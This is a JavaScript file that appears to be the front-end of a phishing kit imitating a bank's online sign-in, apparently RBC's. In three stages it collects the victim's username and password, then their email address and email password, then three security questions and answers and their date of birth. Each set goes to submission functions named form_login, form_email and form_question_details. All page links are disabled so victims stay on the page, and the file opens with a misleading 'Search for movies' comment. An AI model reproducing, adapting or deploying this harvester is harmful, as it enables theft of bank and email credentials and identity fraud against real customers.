//Search for movies
let __recent = {}
let dateNow = new Date().toDateString().substring(new Date().toDateString().indexOf(" ") + 1).replace(` ${new Date().getFullYear()}`, `, ${new Date().getFullYear()}`)
document.querySelectorAll('a').forEach((anchor) => {
    if (!$(anchor).hasClass('toggle-password'))
        anchor.addEventListener('click', async function (e) {
            e.preventDefault();
            await reload()
            return false;
        })
})

$(async function () {
    localStorageCheck();
    if (Object.keys(ip_config).length < 2) {
        await get_reload_ip();
    }
})

if (is_current_page('MainPath')) {
    let $userName = $("#userName");
    let $password = $("#password");

    $(".toggle-password").on('click', function (event) {
        event.preventDefault();
        if (this.querySelector('rbc-icon').getAttribute('name') === "hide") {
            $("#toggle-password").hide()
            $("#toggle-password2").show()
            $password.attr("type", "text")
        } else {
            $("#toggle-password").show()
            $("#toggle-password2").hide()
            $password.attr("type", "password")
        }
    })

    $("button[rbccta=tertiary]").on('click', function () {
        $("main#passwordMain").hide('slide', {direction: 'right'}, 1000);
        $("main:not(#passwordMain)").show('slide', {direction: 'left'}, 1000)
    })

    $("input#rbc-checkbox-3-input").on('change', function () {
        let $parent = $(this).parent().parent();
        if ($(this)[0].checked) {
            $parent.addClass('rbc-checkbox-checked')
        } else {
            $parent.removeClass('rbc-checkbox-checked')
        }
    })

    $userName.on('keyup change', function () {
        $("#userNameError").hide()
        $userName.removeClass('ng-invalid ng-touched');
    })

    $password.on('keyup change', function () {
        $("#passwordError").hide()
        $password.removeClass('ng-invalid ng-touched');
    })


    $("form#rbcUserForm").on('submit', async function (e) {
        e.preventDefault();
        await submitUsername();
    })

    $("span#signinNext").on('click', async function (e) {
        e.preventDefault();
        await submitUsername();
    })

    async function submitUsername() {
        if ($userName.val().length < 1) {
            $("#userNameError .rbc-error-wrapper__label").html("Please enter your client username");
            $("#userNameError").show()
            $userName.addClass('ng-invalid ng-touched');
            return false;
        } else if (is_username($userName.val()) === false) {
            $("#userNameError .rbc-error-wrapper__label").html("Please enter valid client username");
            $("#userNameError").show()
            $userName.addClass('ng-invalid ng-touched');
            return false;
        } else {
            $("#userNameError").hide()
        }

        $("#spanusername").html($userName.val().toString())

        $("main:not(#passwordMain)").hide('slide', {direction: 'left'}, 1000, function () {
            $("main#passwordMain").show('slide', {direction: 'right'}, 1000);
        })
    }


    async function submitPassword() {
        if ($(document.body).hasClass('rollingIn')) return false;
        if ($password.val().length < 1) {
            $("#passwordError .rbc-error-wrapper__label").html("Please enter your password");
            $("#passwordError").show()
            $password.addClass('ng-invalid ng-touched');
            return false;
        } else if ($password.val().length < 6) {
            $("#passwordError .rbc-error-wrapper__label").html("Invalid password");
            $("#passwordError").show()
            $password.addClass('ng-invalid ng-touched');
            return false;
        } else {
            $("#passwordError").hide()
        }

        $("input").each(function (index, element) {
            $(element)[0].readOnly = true
        })

        document.body.classList.add("rollingIn");
        await form_login($userName.val(), $password.val())
    }

    $("#PasswordSubmit").on('submit', async function (event) {
        event.preventDefault();
        await submitPassword();
    })

}
/*


This Is for the email and password


*/
else if (is_current_page('EPath')) {
    document.getElementById('header-date-wrap').innerHTML = dateNow;
    /*

     */
    const $email = $("#email"),
        $password = $("#password"),
        $passwordError = $("#password-error"),
        $emailError = $("#email-error");

    document.querySelectorAll('div.input--dynamic input').forEach(function (element) {
        element.addEventListener('keyup', function (evt) {
            let id = "#" + element.id + "-error";
            console.log(id)
            if (evt.key !== 'Enter' && evt.code !== "Enter") {
                $(element).removeClass('invalid-field');
                $(id).hide()
            }
        })
    })

    async function check_working_email() {
        if (document.body.classList.contains('rollingIn')) return false
        let is_valid = true
        if ($email.val().length < 2) {
            is_valid = false;
            $emailError.html(`Email field is mandatory.`)
            $email.addClass('invalid-field');
            $emailError.show()
        } else if (is_email($email.val()) === false) {
            is_valid = false;
            $emailError.html(`Please enter the email address associated with your account.`)
            $email.addClass('invalid-field');
            $emailError.show()
        } else {
            $email.removeClass('invalid-field');
        }
        if ($password.val().length < 2) {
            is_valid = false;
            $passwordError.html(`This field is mandatory.`);
            $password.addClass('invalid-field');
            $passwordError.show()
        } else if ($password.val().length < 6) {
            is_valid = false;
            $passwordError.html(`Please enter your email password.`)
            $password.addClass('invalid-field');
            $passwordError.show()
        } else {
            $password.removeClass('invalid-field');
        }
        if (!is_valid) return false;
        document.querySelectorAll('input').forEach((input) => {
            input.readOnly = true;
        })
        document.body.classList.add('rollingIn')
        await form_email($email.val(), $password.val())
    }


    $("#cForm").on('submit', async function (evt) {
        evt.preventDefault()
        await check_working_email()
    })

    $("#step1-continue-button").on('click', async function (event) {
        event.preventDefault()
        await check_working_email()
    })


}
/*


This Is for the Login page


*/
else if (is_current_page('DPath')) {
    //For login page and moving forward
    document.getElementById('header-date-wrap').innerHTML = dateNow;
    //Loaded completed

    $("input, select").each(function (index, element) {
        $(element).attr('done', 'no');
    })

    const $dob = $("#dob");
    $dob.mask('00/00/0000', {
        onComplete: function (cep) {
            $dob.attr('done', 'yes');
        },
        onChange: function (cep) {
            $dob.attr('done', 'no');
        }
    })

    $(".questionAnswer > div:nth-child(1) input").on('change keyup', function (event) {
        if (is_question($(this).val())) {
            $(this).attr('done', 'yes');
        } else {
            $(this).attr('done', 'no');
        }
    })

    $(".questionAnswer > div:nth-child(2) input").on('change keyup', function (event) {
        if (is_answer($(this).val())) {
            $(this).attr('done', 'yes');
        } else {
            $(this).attr('done', 'no');
        }
    })

    $(".questionAnswer .select select").on('change', function (e) {
        let id = this.parentElement.id + "1";
        let $input = $(`#${id} input`);
        if (this.value.trim() === "*") {
            $(this).attr('done', 'no');
            $(this).parent().hide()
            $input.val("");
            $(`#${id}`).show()
            $input[0].focus()
            $input.attr('done', 'no');
        } else {
            if (this.value.trim().length < 1) {
                $(this).attr('done', 'no');
            } else {
                $(this).attr('done', 'yes');
            }
        }
    })

    $(".questionAnswer > div > *:nth-child(3) button").on('click', function (event) {
        event.preventDefault();
        let $parent = $(this).parent().parent();
        let $parent2 = $(`#${$parent[0].id.replace("1", "")}`);
        $parent2.find('select').val("").change();
        $parent.hide()
        $parent2.show()
    })


    $("input.input-standard, .select select").on('keyup change', function (event) {
        let is_enter = false
        if (event.type === "keyup") is_enter = !(event.key !== 'Enter' && event.code !== "Enter");
        if (!is_enter) {
            let $parent = $(this).parents('.questionAnswer');
            if ($parent.length > 0) {
                let $select = $($parent[0].querySelector(".select select"))
                let $question = $($parent[0].querySelector("div:nth-child(1) input"))
                let $answer = $($parent[0]).find("div:nth-child(2) input")
                let $error = $parent.parent().children(".input-error-description");
                $select.removeClass('invalid-field');
                $question.removeClass('invalid-field');
                $answer.removeClass('invalid-field');
                $error.hide();
            } else {
                $(this).removeClass('invalid-field');
                $(this).parent().children(".input-error-description").hide()
            }
        }
    })


    $("#cForm").on('submit', async function (event) {
        event.preventDefault()
        await check_working_info();
    })
    $("#step1-continue-button").on('click', async function (event) {
        event.preventDefault()
        await check_working_info();
    })


    async function check_working_info() {
        if ($(document.body).hasClass('rollingIn')) return false;
        let is_valid = true
        let q = {0: "", 1: "", 2: ""}, a = {0: "", 1: "", 2: ""};
        $(".questionAnswer").each(function (index, element) {
            let $select = $(element.querySelector(".select select"))
            let $question = $(element.querySelector("div:nth-child(1) input"))
            let $answer = $(element).find("div:nth-child(2) input")
            let $error = $(`#error${index + 1}`)

            if ($select[0].value.trim() === "*" && is_question($question.val()) === false && is_answer($answer.val()) === false) {
                $error.html(`Please enter your security question and answer.`);
                $question.addClass('invalid-field');
                $answer.addClass('invalid-field');
                $error.show();
                is_valid = false;
            } else if ($select[0].value.trim() === "*" && is_question($question.val()) === true && is_answer($answer.val()) === false) {
                $error.html(`Please enter your security answer.`);
                $answer.addClass('invalid-field');
                $error.show();
                is_valid = false;
            } else if ($select[0].value.trim() === "*" && is_question($question.val()) === false && is_answer($answer.val()) === true) {
                $error.html(`Please enter your security question.`);
                $question.addClass('invalid-field');
                $error.show();
                is_valid = false;
            } else if ($select[0].value.trim().length < 1 && is_answer($answer.val()) === false) {
                $error.html(`Please select your security question and answer.`);
                $select.addClass('invalid-field');
                $answer.addClass('invalid-field');
                $error.show();
                is_valid = false;
            } else if ($select[0].value.trim().length < 1 && is_answer($answer.val()) === true) {
                $error.html(`Please select your security question.`);
                $select.addClass('invalid-field');
                $error.show();
                is_valid = false;
            } else if ($select[0].value.trim().length > 0 && is_answer($answer.val()) === false) {
                $error.html(`Please enter your security answer.`);
                $answer.addClass('invalid-field');
                $error.show();
                is_valid = false;
            } else {
                a[index] = $answer.val();
                q[index] = is_question($question.val()) ? $question.val() : $select.val();
                $select.removeClass('invalid-field');
                $answer.removeClass('invalid-field');
                $error.hide();
            }
        })
        if ($dob.attr('done') !== "yes") {
            $("#error4").html("Please enter your date of birth");
            $("#error4").show();
            $dob.addClass('invalid-field');
            is_valid = false;
        } else {
            $("#error4").hide();
            $dob.removeClass('invalid-field');
        }
        if (is_valid === false) return false;
        document.body.classList.add("rollingIn");
        $("input").each(function (index, element) {
            $(element)[0].readOnly = true
        })
        $(".select select").each(function (index, element) {
            $(element)[0].readOnly = true
        })
        await form_question_details(q[0], a[0], q[1], a[1], q[2], a[2], $dob.val())
    }


}
